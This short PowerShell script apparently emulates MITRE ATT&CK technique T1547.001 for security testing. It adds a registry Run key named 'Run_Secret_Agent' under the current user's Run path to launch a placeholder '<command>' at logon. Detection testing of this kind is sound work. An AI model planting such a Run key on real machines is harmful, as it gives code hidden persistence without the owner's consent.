# Add Rey Key
# Technic ID : T1547.001
Clear-Host
Write-Output "==============================================================================="
Write-Output "Boot or Logon Autostart Execution: Registry Run Keys / Startup (T1547.001)"
Write-Output "==============================================================================="
#
Start-Process "cmd.exe" -ArgumentList "/c REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /V \"Run_Secret_Agent\" /t REG_SZ /F /D \"<command>\"" -NoNewWindow -Wait